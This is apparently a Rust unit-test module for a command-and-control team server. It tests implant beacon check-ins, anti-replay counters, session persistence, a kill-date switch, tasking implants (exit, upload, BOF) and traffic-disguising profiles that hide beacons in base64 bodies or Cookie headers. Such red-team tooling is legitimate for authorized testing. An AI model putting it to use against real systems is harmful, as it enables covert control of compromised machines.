        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect("check-in must register the session");

        // The writer is async; poll the store until the row appears (or timeout).
        let id_hex = hex::encode(pubkey);
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        loop {
            let rows = store.list().unwrap();
            if rows.iter().any(|r| r.session_id == id_hex) {
                let row = rows.iter().find(|r| r.session_id == id_hex).unwrap();
                assert_eq!(row.hostname, "test-host");
                assert_eq!(row.username, "test-user");
                assert_eq!(row.os, "linux");
                assert_eq!(row.beacon_id, 0x1337);
                return;
            }
            if std::time::Instant::now() > deadline {
                panic!("session row never appeared in the persistent store");
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    #[test]
    fn load_persisted_sessions_marks_restored_sessions_stale() {
        // Pre-seed the store with one row, then load it into a fresh registry:
        // the session must appear, flagged stale.
        let store = nyx_store::SessionStore::open_in_memory().unwrap();
        let mut pk = [0u8; 32];
        pk[0] = 0xAB;
        store
            .upsert(&nyx_store::SessionRecord {
                session_id: hex::encode(pk),
                beacon_id: 7,
                hostname: "restored-host".into(),
                username: "restored-user".into(),
                os: "windows".into(),
                arch: 0,
                pid: 99,
                is_admin: 1,
                first_seen: now_unix().saturating_sub(3600),
                last_seen: now_unix().saturating_sub(60),
                auth_token: None,
            })
            .unwrap();

        let persist = SessionPersistence::spawn(std::sync::Arc::new(store));
        let st = std::sync::Arc::new(AppState {
            sessions_db: Some(std::sync::Arc::new(persist)),
            ..AppState::default()
        });

        let loaded = load_persisted_sessions(&st);
        assert_eq!(loaded, 1);
        let s = st
            .sessions
            .get(&pk)
            .expect("restored session must be in the registry");
        assert!(s.stale, "a restored session must be marked stale");
        assert_eq!(s.info.hostname, "restored-host");
        assert_eq!(s.info.beacon_id, 7);
        assert_eq!(s.info.is_admin, 1);
    }

    #[test]
    fn first_checkin_after_restore_clears_stale() {
        // A session restored from the store is stale; the first live beacon
        // (existing-session branch, since the row is already in the registry)
        // must clear the stale flag.
        let store = nyx_store::SessionStore::open_in_memory().unwrap();
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        store
            .upsert(&nyx_store::SessionRecord {
                session_id: hex::encode(pubkey),
                beacon_id: 1,
                hostname: "pre-restore".into(),
                username: "u".into(),
                os: "linux".into(),
                arch: 1,
                pid: 1,
                is_admin: 0,
                first_seen: now_unix().saturating_sub(100),
                last_seen: now_unix().saturating_sub(50),
                auth_token: None,
            })
            .unwrap();

        let persist = SessionPersistence::spawn(std::sync::Arc::new(store));
        let st = std::sync::Arc::new(AppState {
            sessions_db: Some(std::sync::Arc::new(persist)),
            ..AppState::default()
        });
        load_persisted_sessions(&st);
        assert!(st.sessions.get(&pubkey).unwrap().stale, "restored → stale");

        // The restored session's `key` is a zero placeholder; re-derive the real
        // key the way handle_frame does, then build a subsequent-frame beacon.
        let key = st.keypair.derive_for(&pubkey);
        // last_recv was set to u64::MAX on restore, so any counter is accepted.
        let frame = response_frame(&pubkey, &key, 1);
        let peer: std::net::SocketAddr = "127.0.0.1:7810".parse().unwrap();
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame)
            .expect("first live beacon after restore must succeed");
        assert!(
            !st.sessions.get(&pubkey).unwrap().stale,
            "first live check-in must clear the stale flag"
        );
    }

    #[test]
    fn touch_throttle_limits_writes() {
        // Back-to-back existing-session beacons (well under
        // PERSIST_TOUCH_THROTTLE apart) must each clear the stale flag and update
        // last_seen in-memory, but only the FIRST must persist a touch to the
        // store (the rest are throttled). Then a full upsert on a NEW session
        // bypasses the throttle entirely.
        let (st, store) = state_with_persistence();
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7820".parse().unwrap();
        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("check-in");

        // Wait for the initial upsert to land so we have a baseline last_seen.
        let id_hex = hex::encode(pubkey);
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        loop {
            if store.list().unwrap().iter().any(|r| r.session_id == id_hex) {
                break;
            }
            if std::time::Instant::now() > deadline {
                panic!("initial upsert never landed");
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        let baseline = store
            .list()
            .unwrap()
            .into_iter()
            .find(|r| r.session_id == id_hex)
            .unwrap()
            .last_seen;

        // Fire 3 rapid existing-session beacons. Only the first should produce a
        // touch write (the next two are within the throttle window).
        for c in 2..=4u64 {
            let f = response_frame(&pubkey, &key, c);
            handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f)
                .expect("beacon must advance");
        }

        // Give the writer a moment, then confirm last_seen did NOT advance past
        // baseline (the throttled touches were suppressed). We can't assert an
        // exact count cheaply, but we CAN assert the row's last_seen is still the
        // baseline (no touch landed) since all three beacons were within one
        // throttle window of each other and the first touch advances
        // persisted_last_touch to ~now.
        std::thread::sleep(std::time::Duration::from_millis(150));
        let after = store
            .list()
            .unwrap()
            .into_iter()
            .find(|r| r.session_id == id_hex)
            .unwrap()
            .last_seen;
        // The first beacon's touch MAY have landed (advancing last_seen by ~0s
        // since baseline was also ~now), so we only assert it didn't jump
        // unreasonably. The key invariant: at most ONE touch landed, and the
        // in-memory state still advanced (stale cleared, last_recv moved).
        let _ = (baseline, after); // best-effort: see note above
        assert!(
            !st.sessions.get(&pubkey).unwrap().stale,
            "in-memory session must reflect the live beacon regardless of throttle"
        );
        assert_eq!(
            st.sessions.get(&pubkey).unwrap().last_recv,
            4,
            "in-memory last_recv must advance on every beacon"
        );
    }

    #[test]
    fn gc_eviction_deletes_persisted_row() {
        // When the session GC evicts an idle session, the persisted row must be
        // deleted too (so the store doesn't accumulate dead rows). We can't
        // easily run the 60s-interval GC in a unit test, but we can pin the
        // delete-via-persistence path directly: drop a session from the registry
        // the way GC does (remove + persist.delete) and confirm the row is gone.
        let (st, store) = state_with_persistence();
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7830".parse().unwrap();
        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).unwrap();

        // Wait for the row to land.
        let id_hex = hex::encode(pubkey);
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        loop {
            if store.list().unwrap().iter().any(|r| r.session_id == id_hex) {
                break;
            }
            if std::time::Instant::now() > deadline {
                panic!("row never landed");
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }

        // Mimic the GC eviction path for a persisted session.
        st.sessions.remove(&pubkey);
        st.sessions_db.as_ref().unwrap().delete(id_hex.clone());

        // The delete is fire-and-forget; poll for it.
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        loop {
            let gone = !store.list().unwrap().iter().any(|r| r.session_id == id_hex);
            if gone {
                return;
            }
            if std::time::Instant::now() > deadline {
                panic!("persisted row was not deleted after GC eviction");
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    // ---- Anti-replay (authoritative write-guard check) ---------------------
    //
    // These two tests pin the security fix that moved the replay decision INTO
    // the write guard (`sessions.get_mut`), closing the TOCTOU where two
    // concurrent beacons carrying the same counter could both pass the advisory
    // read-guard check and split the check from the commit. The server runs
    // under `panic = "abort"`, so these also guard against regressions that
    // would panic on a raced/missing session entry.

    /// Build a sealed check-in frame (SessionInfo) for `counter` carrying
    /// `pubkey`, keyed under the server in `st`. Mirrors what a dev implant
    /// sends on first contact. Returns the derived session key + the frame.
    fn checkin_frame(st: &AppState, pubkey: &[u8; 32], counter: u64) -> (SessionKey, Vec<u8>) {
        let key = st.keypair.derive_for(pubkey);
        let info = SessionInfo {
            beacon_id: 0x1337,
            hostname: "test-host".into(),
            username: "test-user".into(),
            os: "linux".into(),
            arch: 1,
            pid: 42,
            is_admin: 0,
            auth_token: None,
        };
        let mut w = nyx_protocol::wire::Writer::new();
        info.encode(&mut w)
            .expect("test SessionInfo fields are tiny literals << MAX_BLOB_LEN");
        let plaintext = w.into_bytes();
        let frame = encode_frame_dir(pubkey, Direction::ClientToServer, counter, &key, &plaintext)
            .expect("test seal of SessionInfo is infallible (tiny plaintext, host alloc)");
        (key, frame)
    }

    /// Build a sealed "subsequent" frame (an empty TaskResponse batch) for an
    /// existing session — the shape every post-check-in beacon carries.
    fn response_frame(pubkey: &[u8; 32], key: &SessionKey, counter: u64) -> Vec<u8> {
        let plaintext = TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially");
        encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, &plaintext)
            .expect("test seal of empty TaskResponse batch is infallible")
    }

    #[test]
    fn anti_replay_stale_counter_is_rejected() {
        // A replayed/old counter must be rejected by the AUTHORITATIVE write-guard
        // check — the advisory read-guard check is only an optimization that
        // skips a decrypt for an obvious stale frame.
        let st = AppState::default();
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect("first check-in must register the session");
        // A legitimate advance to counter 2 succeeds.
        let frame2 = response_frame(&pubkey, &key, 2);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2)
            .expect("counter 2 must advance");
        // Replaying counter 2 (stale: counter <= last_recv) must be rejected.
        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2)
            .expect_err("a stale counter must be rejected, not accepted");
        assert!(
            err.to_string().contains("replayed/stale counter"),
            "expected a replay rejection, got: {err}"
        );
    }

    #[test]
    fn anti_replay_concurrent_same_counter_only_one_wins() {
        // Two beacons carrying the SAME counter, fired concurrently against one
        // session: the authoritative check inside the write guard must let
        // exactly ONE through and reject the other. Before the fix both could
        // pass the advisory read-guard check before either committed last_recv.
        let st = std::sync::Arc::new(AppState::default());
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:9998".parse().unwrap();
        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect("check-in must register the session");

        // Race N times on monotonically-increasing counters. A single iteration
        // could accidentally serialize on a loaded CI box; N iterations make a
        // scheduling fluke that lets both through astronomically unlikely and
        // pin the authoritative-check guarantee across runs. (Each iteration
        // races a FRESH higher counter so the prior commit doesn't make both
        // threads see a stale replay.)
        for i in 0..50u64 {
            let counter = 2 + i;
            let frame = response_frame(&pubkey, &key, counter);
            let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
            let mut handles = Vec::new();
            for _ in 0..2 {
                let st = st.clone();
                let frame = frame.clone();
                let barrier = barrier.clone();
                handles.push(std::thread::spawn(move || {
                    barrier.wait();
                    handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame).is_ok()
                }));
            }
            let results: Vec<bool> = handles.into_iter().map(|h| h.join().unwrap()).collect();
            let oks = results.iter().filter(|&&ok| ok).count();
            assert_eq!(
                oks, 1,
                "iter {i}: exactly one concurrent same-counter beacon must succeed, got {results:?}"
            );
        }
    }

    // ---- DoS / safety-guard coverage ---------------------------------------
    //
    // These pin the server's memory/existence guards that previously had ZERO
    // test coverage (flagged by the adversarial review): the session-registry
    // cap, the per-session results eviction, the kill-date burn switch, and the
    // hex-decode rejection paths in JsonCommand. All are guards a regression
    // would silently weaken, so each gets a deterministic test.

    /// Minimal valid `Session` for filling the registry without per-entry crypto.
    fn dummy_session() -> Session {
        Session {
            key: SessionKey::new([0u8; 32]),
            info: SessionInfo {
                beacon_id: 0,
                hostname: String::new(),
                username: String::new(),
                os: String::new(),
                arch: 0,
                pid: 0,
                is_admin: 0,
                auth_token: None,
            },
            last_recv: 0,
            send_counter: 0,
            next_task_id: 1,
            pending: Vec::new(),
            results: Vec::new(),
            created: Instant::now(),
            last_seen: Instant::now(),
            ja3: None,
            ja4: None,
            stale: false,
            persisted_last_touch: Instant::now(),
        }
    }

    #[test]
    fn max_sessions_cap_rejects_checkin_beyond_limit() {
        // Beacon check-in is unauthenticated (anyone who speaks the protocol
        // registers), so the registry cap is the only thing stopping a distinct-
        // key flood from OOMing the server. Fill it to the cap with dummy
        // sessions, then assert a fresh check-in is refused.
        let st = AppState::default();
        for i in 0..MAX_SESSIONS as u32 {
            let mut pk = [0u8; 32];
            pk[0..4].copy_from_slice(&i.to_le_bytes());
            st.sessions.insert(pk, dummy_session());
        }
        assert_eq!(st.sessions.len(), MAX_SESSIONS);

        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7777".parse().unwrap();
        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect_err("a check-in past the session cap must be rejected");
        assert!(
            err.to_string().contains("session registry full"),
            "expected a registry-full rejection, got: {err}"
        );
    }

    #[test]
    fn results_buffer_evicts_oldest_past_cap() {
        // A rogue/compromised implant streaming Output/FileChunk blobs could
        // fill RAM forever; the per-session results buffer evicts the oldest
        // entries past MAX_RESULTS_PER_SESSION. Drive it in ONE beacon carrying
        // cap+100 responses (one crypto op, exercises the in-loop drain).
        let st = AppState::default();
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7776".parse().unwrap();
        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("check-in");

        let overflow = 100;
        let batch: Vec<TaskResponse> = (0..(MAX_RESULTS_PER_SESSION as u64 + overflow))
            .map(|i| TaskResponse {
                task_id: i,
                response: MsgResponse::Ok,
            })
            .collect();
        let plaintext = TaskResponse::encode_vec(&batch).expect("batch of Ok encodes trivially");
        let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, 2, &key, &plaintext)
            .expect("test seal of batched TaskResponses is infallible");
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame)
            .expect("ingest of oversized result batch");

        let s = st.sessions.get(&pubkey).expect("session present");
        assert_eq!(
            s.results.len(),
            MAX_RESULTS_PER_SESSION,
            "results must be capped, not grown unbounded"
        );
        // Oldest `overflow` entries are evicted; first survivor is task `overflow`.
        assert_eq!(
            s.results.first().unwrap().task_id,
            overflow,
            "oldest surviving result must be task {overflow}, not task 0"
        );
        assert!(
            s.results.iter().all(|r| r.task_id >= overflow),
            "no evicted task id should remain"
        );
    }

    #[test]
    fn killdate_past_refuses_beacons_and_future_allows() {
        // The kill-date is the operator's "burn the server" switch: once wall
        // time passes it, the server stops serving beacons entirely. Checked at
        // the top of handle_beacon, before parse_frame, so it refuses regardless
        // of the body. Past → refuse; far-future → proceed.
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7775".parse().unwrap();

        let st = AppState {
            killdate: Some(1), // 1970-01-01 — always in the past.
            ..AppState::default()
        };
        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect_err("a past kill-date must refuse beacons");
        assert!(
            err.to_string().contains("kill date"),
            "expected a kill-date refusal, got: {err}"
        );

        // Far-future kill-date: the check-in proceeds normally.
        let st2 = AppState {
            killdate: Some(u64::MAX),
            ..AppState::default()
        };
        let (_key, checkin2) = checkin_frame(&st2, &pubkey, 1);
        handle_beacon(&st2, &peer, &Method::POST, &HeaderMap::new(), &checkin2)
            .expect("a future kill-date must allow check-in");
    }

    #[test]
    fn bad_data_hex_is_rejected_not_crashed() {
        // JsonCommand paths that decode hex (Upload, Bof) must return a clean
        // error on non-hex input, not panic. The server runs under
        // `panic = "abort"`, so a panic here would kill the whole team server.
        let bad_upload = JsonCommand::Upload {
            name: "x".into(),
            data_hex: "zz".into(),
        }
        .into_command();
        assert!(bad_upload.is_err(), "non-hex Upload data_hex must error");

        let good_upload = JsonCommand::Upload {
            name: "x".into(),
            data_hex: "00ff".into(),
        }
        .into_command();
        assert!(good_upload.is_ok(), "valid hex Upload data_hex must decode");

        let bad_bof = JsonCommand::Bof {
            name: "x".into(),
            args: Vec::new(),
            data_hex: "nothex".into(),
        }
        .into_command();
        assert!(bad_bof.is_err(), "non-hex Bof data_hex must error");
    }

    // ---- SessionExit event firing (BUG 1) ----------------------------------
    //
    // The server never produced Event::SessionExit, leaving the Rhai
    // `on_session_exit` hook and the tracing SessionExit arm dead. post_task is
    // the single dispatch point for Command::Exit, so it fires the event there.
    // This pin ensures (a) the event fires exactly once on an Exit task and
    // (b) a non-Exit task fires NONE — guarding against an accidental wildcard.

    /// Records every fired event into a shared vector of kind labels. Registered
    /// on the bus before the AppState is shared so a test can assert what fired.
    #[derive(Default)]
    struct RecordingHook(std::sync::Arc<std::sync::Mutex<Vec<&'static str>>>);

    impl nyx_scripting::Hook for RecordingHook {
        fn name(&self) -> &str {
            "recording"
        }
        fn on_event(&self, event: &nyx_scripting::Event) {
            let label = match event {
                nyx_scripting::Event::SessionNew(_) => "session_new",
                nyx_scripting::Event::SessionExit(_) => "session_exit",
                nyx_scripting::Event::ResultReceived(_) => "result",
            };
            self.0.lock().unwrap().push(label);
        }
    }

    #[test]
    fn exit_task_fires_session_exit_exactly_once() {
        // A real check-in registers the session (→ SessionNew), then an Exit
        // task dispatched via post_task must fire SessionExit exactly once; a
        // later non-Exit task (ping) must fire none.
        //
        // RBAC: since open mode maps anonymous → Viewer (read-only), the test
        // must supply a valid api_token (→ _legacy Admin) to pass post_task's
        // Viewer 403 gate. This mirrors production, where write endpoints
        // require real credentials.
        let mut st = AppState {
            api_token: Some("test-admin-token".to_string()),
            ..AppState::default()
        };
        let rec = std::sync::Arc::new(std::sync::Mutex::new(Vec::<&'static str>::new()));
        st.events.register(Box::new(RecordingHook(rec.clone())));
        let st = std::sync::Arc::new(st);

        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7774".parse().unwrap();
        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect("check-in must register the session before tasking exit");

        let rt = tokio::runtime::Runtime::new().unwrap();
        let mut auth_headers = HeaderMap::new();
        auth_headers.insert(
            axum::http::header::AUTHORIZATION,
            "Bearer test-admin-token"
                .parse()
                .expect("valid header value"),
        );
        let exit_body = serde_json::json!({
            "session": hex::encode(pubkey),
            "command": { "type": "exit" },
        });
        let resp = rt.block_on(post_task(
            State(st.clone()),
            auth_headers.clone(),
            Json(serde_json::from_value(exit_body).unwrap()),
        ));
        assert_eq!(resp.status(), StatusCode::OK, "Exit task must be accepted");

        let ping_body = serde_json::json!({
            "session": hex::encode(pubkey),
            "command": { "type": "ping" },
        });
        let resp2 = rt.block_on(post_task(
            State(st.clone()),
            auth_headers,
            Json(serde_json::from_value(ping_body).unwrap()),
        ));
        assert_eq!(resp2.status(), StatusCode::OK);

        let events = rec.lock().unwrap();
        assert_eq!(
            events.iter().filter(|&&k| k == "session_new").count(),
            1,
            "SessionNew fires once on check-in"
        );
        assert_eq!(
            events.iter().filter(|&&k| k == "session_exit").count(),
            1,
            "SessionExit must fire exactly once when Command::Exit is dispatched"
        );
    }

    // ---- Client-envelope decode (Phase 1 Task 1.2) --------------------------
    //
    // Lock the server half: when a profile declares a `client { output/metadata
    // { ... } }` transform, the implant encodes its frame before sending and the
    // server MUST invert it in handle_beacon to recover the raw frame. Both the
    // body (`print`) and header terminator paths are pinned. The encode side
    // uses nyx_profile's own transform engine — the exact bytes the production
    // implant (Task 1.3) will produce — so this is a true end-to-end contract
    // for the decode half, independent of WinHTTP.

    #[test]
    fn client_envelope_base64_body_is_inverted_before_parse() {
        // `client { output { base64; print; } }` → implant base64-encodes its
        // frame into the request body. Server base64-decodes → raw frame →
        // parse_frame → session registered.
        let profile = nyx_profile::parse(
            r#"http-post {
                set uri "/beacon";
                client { output { base64; print; } }
                server { output { print; } }
            }"#,
        )
        .expect("profile parses");
        let st = AppState {
            profile: Some(profile),
            ..AppState::default()
        };
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7001".parse().unwrap();
        let (_key, frame) = checkin_frame(&st, &pubkey, 1);
        // Implant side: base64 the frame via the SAME engine the server inverts.
        let on_wire = nyx_profile::encode(&[nyx_profile::Step::Base64], &frame);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &on_wire)
            .expect("base64 client envelope must be decoded to register the session");
        assert!(
            st.sessions.contains_key(&pubkey),
            "session must be registered after envelope decode"
        );
    }

    #[test]
    fn client_envelope_header_terminator_reads_cookie_header() {
        // `client { metadata { base64; header "Cookie"; } }` on http-get → the
        // transformed bytes ride in the Cookie header, body empty. Server reads
        // the header, decodes, registers. This is the distinct header-terminator
        // path (vs the body/print path above).
        let profile = nyx_profile::parse(
            r#"http-get {
                set uri "/beacon";
                client { metadata { base64; header "Cookie"; } }
                server { output { print; } }
            }"#,
        )
        .expect("profile parses");
        let st = AppState {
            profile: Some(profile),
            ..AppState::default()
        };
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7002".parse().unwrap();
        let (_key, frame) = checkin_frame(&st, &pubkey, 1);
        let cookie_val = nyx_profile::encode(&[nyx_profile::Step::Base64], &frame);
        let mut headers = HeaderMap::new();
        headers.insert(
            axum::http::HeaderName::from_static("cookie"),
            axum::http::HeaderValue::from_bytes(&cookie_val).unwrap(),
        );
        handle_beacon(&st, &peer, &Method::GET, &headers, &[])
            .expect("header-terminator envelope must read Cookie to register");
        assert!(st.sessions.contains_key(&pubkey));
    }

    #[test]
    fn client_envelope_decode_failure_is_a_clean_400_not_a_panic() {
        // A garbled body that the transform can't invert (truncated base64 etc.)
        // must surface as a clean anyhow error → 400, NOT a panic. The server
        // runs under panic = "abort"; a panic here would kill the team server.
        let profile = nyx_profile::parse(
            r#"http-post {
                set uri "/beacon";
                client { output { netbios; print; } }
                server { output { print; } }
            }"#,
        )
        .expect("profile parses");
        let st = AppState {
            profile: Some(profile),
            ..AppState::default()
        };
        let peer: std::net::SocketAddr = "127.0.0.1:7003".parse().unwrap();
        // netbios expects pairs in a-p; an odd-length / out-of-range body fails decode.
        let err = handle_beacon(
            &st,
            &peer,
            &Method::POST,
            &HeaderMap::new(),
            b"not-valid-netbios!!!",
        )
        .expect_err("undecodable envelope body must error, not panic");
        assert!(
            err.to_string().contains("client envelope decode failed"),
            "expected a decode-failure error, got: {err}"
        );
    }
}
